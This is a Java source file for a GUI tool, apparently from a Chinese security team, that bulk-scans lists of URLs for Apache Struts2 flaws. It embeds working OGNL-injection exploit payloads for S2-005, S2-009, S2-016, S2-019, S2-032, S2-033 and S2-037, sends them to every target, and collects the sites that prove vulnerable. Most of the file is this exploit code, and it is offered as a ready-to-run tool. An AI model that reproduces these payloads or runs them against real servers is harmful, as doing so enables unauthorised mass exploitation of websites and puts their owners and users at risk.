//米斯特安全团队开发的一款关于Struts2漏洞批量扫描的程序
//请各位懂Java的朋友能一起来维护，写得更好。
//代码开源仅供各位朋友学习Java，切勿做违法犯罪。
//代码中有不懂的地方可以联系本人QQ：627437686
import java.awt.Container;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;

public class Str2new extends JFrame
{
  private JFrame jf;
  private JLabel jl;
  private JButton Jc;
  private JTextArea Shuru;
  private JTextArea ShuChu;
  private JScrollPane gShuChu;
  private JScrollPane gShuru;
  private JLabel JieG;
  private JLabel AD;
  private JButton Dtext;
  private JLabel Sy;
  private JButton Cq;
  StringBuffer yx = new StringBuffer();
  private void CreateJFrame()
  {
    this.jf = new JFrame("米斯特安全团队周年福利 Str2批量检测工具 v2.0.3");
    Container container = this.jf.getContentPane();
    container.setLayout(null);
    this.jl = new JLabel("=====填写所需检测的网址====");
    this.Jc = new JButton("检测");
    this.Dtext = new JButton("读取文本");
    this.Shuru = new JTextArea();
    this.ShuChu = new JTextArea();
    this.gShuChu = new JScrollPane(this.ShuChu);
    this.gShuru = new JScrollPane(this.Shuru);
    this.Cq = new JButton("取有效");
    this.JieG = new JLabel("======测试结果======");
    this.AD = new JLabel("米斯特安全团队网址:www.hi-ourlife.com          程序作者:米斯特_A先森");
    this.Sy = new JLabel("<html><body>使用说明：<br>程序目录下有<br>wz.txt<br>可将网址放进去<br>按下读取即可<br>接下来按检测</body></html>");
    this.ShuChu.setText("米斯特网络攻防实验室:Mst.Hi-OurLife.Com \n\n v2.0.3版本 核心用了之后给的建议 \n v2.0.3版本新特性：\n 支持扫描后取存在漏洞的网址 \n 增加了用户体验 希望使用愉快  \n\n 程序难免有BUG,程序反馈请联系QQ：627437686 \n 有更多的EXP也可以联系,多谢！");   
    this.jl.setBounds(10, 0, 300, 20);
    this.Jc.setBounds(420, 200, 80, 20);
    this.JieG.setBounds(10, 220, 200, 20);
    this.gShuru.setBounds(10, 20, 400, 200);
    this.gShuChu.setBounds(10, 240, 400, 200);
    this.AD.setBounds(10, 440, 500, 20);
    this.Dtext.setBounds(420, 20, 80, 20);
    this.Sy.setBounds(420,10,200,200);
    this.Cq.setBounds(420,240, 80, 20);
    container.add(this.jl);
    container.add(this.Jc);
    container.add(this.gShuru);
    container.add(this.gShuChu);
    container.add(this.JieG);
    container.add(this.AD);
    container.add(this.Dtext);
    container.add(this.Sy);
    container.add(this.Cq);
    this.jf.setVisible(true);
    this.jf.setSize(530, 500);
    this.jf.setDefaultCloseOperation(3);
    this.Jc.addActionListener(new ActionListener() {
      public void actionPerformed(ActionEvent evt) {
        try {
          Str2new.this.jButton1ActionPerformed(evt);
        } catch (Exception e) {
          e.printStackTrace();
        }
      } } );
    this.Dtext.addActionListener(new ActionListener(){
    	public void actionPerformed(ActionEvent evt){
    		File file = new File("wz.txt");
    		if(file.exists()){
    			try{
    				InputStreamReader read = new InputStreamReader(
    						new FileInputStream(file));
    				BufferedReader bufferedReader = new BufferedReader(read);
    				String lineTxt = null;
    				Str2new.this.Shuru.setText(null);
    				String duqu="";
                    while((lineTxt = bufferedReader.readLine()) != null){
                    	duqu = duqu+lineTxt+"\n";
                    }
                    duqu = duqu.substring(0,(duqu.length()-1));
                    Str2new.this.Shuru.setText(duqu);
                    read.close();
    			}catch(Exception e1){
    				e1.printStackTrace();
    			}
    		}else{
    			try{
    				file.createNewFile();
    				Str2new.this.ShuChu.setText("检测不到wz.txt 已自动添加");
    			}catch(Exception e){
    				e.printStackTrace();
    			}
    		}
    	}
    });
    this.Cq.addActionListener(new ActionListener(){
    	public void actionPerformed(ActionEvent evt){
    		ShuChu.setText("为您显示出所有存在漏洞的网址\n"+yx.toString());
    	}
    });
  }

  private void jButton1ActionPerformed(ActionEvent evt) throws Exception {
    String Zz = "http(s)?://(\\w+\\.)*\\S+\\.\\w+\\S*(\nhttp(s)?://(\\w+\\.)*\\S+\\.\\w+\\S*)*";
    if (this.Shuru.getText().equals("")) {
      this.ShuChu.setText("没输入网址？");
    }
    else if (this.Shuru.getText().matches(Zz)) {
      String url = this.Shuru.getText();
      StringBuffer sb = new StringBuffer();
      String[] urlfg = url.split("\n");
      this.ShuChu.setText("程序开始运行...米斯特成立一周年www.hi-ourlife.com");
      for (int i = 0; i < urlfg.length; i++) {
        String s032code = s032(urlfg[i]);
        System.out.println("s032 OK!");
        String s033code = s033(urlfg[i]);
        System.out.println("s033 OK!");
        String s037code = s037(urlfg[i]);
        System.out.println("s037 OK!");
        String s016code = s016(urlfg[i]);
        System.out.println("s016 OK!");
        String s019code = s019(urlfg[i]);
        System.out.println("s019 OK!");
        String s005code = s005(urlfg[i]);
        System.out.println("s005 OK!");
        String s009code = s009(urlfg[i]);
        System.out.println("s009 OK!");
        sb.append("\n以下是" + urlfg[i] + "的检测结果" + "\n");
        sb.append(s005code + "\n");
        sb.append(s009code + "\n");
        sb.append(s016code + "\n");
        sb.append(s019code + "\n");
        sb.append(s032code + "\n");
        sb.append(s033code + "\n");
        sb.append(s037code);
        this.ShuChu.setText(this.ShuChu.getText() + sb.toString() + "\n" + urlfg[i] + "检测完毕!");
        sb.delete(0, sb.capacity());
      }
    } else {
      this.ShuChu.setText("经判断 不是网址 或者是缺少http://或https://");
    }
  }
  /* 一个毫无卵用的多线程。
  class Demo extends Thread{
	    public void run(){
	        for(int i=0;i<60;i++){
	            System.out.println(Thread.currentThread().getName()+i);
	        }
	    }
	}
	*/
  public String s032(String url)
    throws IOException
  {
    String s032poc = "?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=shuaida";
    String s032url = url + s032poc;
    String s032htmls = getPageSource(s032url, "GBK");
    s032htmls = s032htmls.replace("\n", "");
    if ("shuaida".equals(s032htmls)) {
    	this.yx.append(url+"存在S2-032漏洞\n");
      return "该链接存在S2-032漏洞,地址:" + url;
    }else{
    return "该链接不存在S2-032漏洞";
    }
  }

  public String s016(String url)
  {
    try
    {
      String s033poc = "?redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/shuaida%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D";
      String s033url = url + s033poc;
      String s033htmls = getPageSource(s033url, "GBK");
      s033htmls = s033htmls.replace("\n", "");
      s033htmls = s033htmls.substring(s033htmls.length() - 7, s033htmls.length());
      if ("shuaida".equals(s033htmls)) {
    	 this.yx.append(url+" 存在S2-016漏洞\n");
        return "该链接存在S2-016漏洞,地址:" + url;
      }
      return "该链接不存在S2-016漏洞";
    } catch (Exception localException) {
    	return "该链接不存在S2-016漏洞";
    }
  }

  public String s037(String url)
  {
    String s037poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=shuaida";
    String s037url = url + s037poc;
    String s037htmls = getPageSource(s037url, "GBK");
    s037htmls = s037htmls.replace("\n", "");
    if ("shuaida".equals(s037htmls)) {
    	this.yx.append(url+"存在S2-037漏洞\n");
      return "该链接存在S2-037漏洞,地址:" + url;
    }else{
    return "该链接不存在S2-037漏洞";
    }
  }

  public String s033(String url)
  {
    String s033poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=shuaida";
    String s033url = url + s033poc;
    String s033htmls = getPageSource(s033url, "GBK");
    s033htmls = s033htmls.replace("\n", "");
    if ("shuaida".equals(s033htmls)) {
    	this.yx.append(url+"存在S2-033漏洞\n");
      return "该链接存在S2-033漏洞,地址:" + url;
    }else{
    return "该链接不存在S2-033漏洞";
    }
  }

  public String s019(String url)
  {
    try
    {
      String s019poc = "?debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path88888887:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()";
      String s019url = url + s019poc;
      String s019htmls = getPageSource(s019url, "GBK");
      s019htmls = s019htmls.replace("\n", "");
      s019htmls = s019htmls.substring(0, 20);

      if (s019htmls.indexOf("88888887") != -1) {
    	  this.yx.append(url+"存在S2-019漏洞\n");
        return "该链接存在S2-019漏洞,地址:" + url;
      }
      return "该链接不存在S2-019漏洞";
    }
    catch (Exception e)
    {
      e.printStackTrace();
    }
    return "该链接不存在S2-019漏洞";
  }

  public String s009(String urls)
  {
    String result = null;
    HttpURLConnection httpCon = null;
    try {
      URL url = new URL(urls);
      httpCon = (HttpURLConnection)url.openConnection();

      httpCon.setDoInput(true);

      httpCon.setDoOutput(true);

      httpCon.setRequestMethod("POST");

      httpCon.setRequestProperty("Content-Type", 
        "application/x-www-form-urlencoded");
      StringBuffer sb = new StringBuffer();
      sb.append("class.classLoader.jarPath=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]= new java.lang.Boolean(false), %23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23outstr.print(%22shuaida%22),%23outstr.println(%23req.getRealPath(%22/%22)),%23outstr.close())(meh)&z[(class.classLoader.jarPath)('meh')]");
      OutputStream os = httpCon.getOutputStream();
      os.write(sb.toString().getBytes("GBK"));
      System.out.println("形成的地址：" + sb.toString());
      os.flush();
      os.close();
      BufferedReader br = new BufferedReader(new InputStreamReader(
        httpCon.getInputStream()));
      httpCon.connect();
      result = br.readLine();
      result = result.substring(0, 20);
      br.close();

      if (result.indexOf("shuaida") != -1) {
    	  this.yx.append(url+"存在S2-009漏洞\n");
        return "该链接存在S2-009漏洞,地址:" + url;
      }else{
    	return "该链接不存在S2-009漏洞";
      }
    }
    catch (Exception e)
    {
      return "该链接不存在S2-009漏洞";
    } finally {
      if (httpCon != null) {
        httpCon.disconnect();
        httpCon = null;
      }
    }
  }

  public String s005(String url)
    throws Exception
  {
    try
    {
      String s005poc = "?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(\\43req.getRealPath(%22shuaida\\u005c%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
      String s005url = url + s005poc;
      String s005htmls = getPageSource(s005url, "GBK");
      s005htmls = s005htmls.replace("\n", "");
      s005htmls = s005htmls.substring(s005htmls.length() - 7, s005htmls.length());
      if ("shuaida".equals(s005htmls)) {
    	  this.yx.append(url+"存在S2-005漏洞\n");
        return "该链接存在S2-005漏洞,地址:" + url;
      }else{
      return "该链接不存在S2-005漏洞";
      }
    }
    catch (Exception e)
    {
      e.printStackTrace();
    }
    return "该链接不存在S2-005漏洞";
  }

  public String getPageSource(String pageUrl, String encoding) {
    StringBuffer sb = new StringBuffer();
    try
    {
      URL url = new URL(pageUrl);

      BufferedReader in = new BufferedReader(new InputStreamReader(
        url.openStream(), encoding));
      String line;
      while ((line = in.readLine()) != null)
      {
        sb.append(line);
        sb.append("\n");
      }
      in.close();
    } catch (Exception ex) {
      System.err.println(ex);
    }
    return sb.toString();
  }

  public static void main(String[] args) {
    new Str2new().CreateJFrame();
  }
}
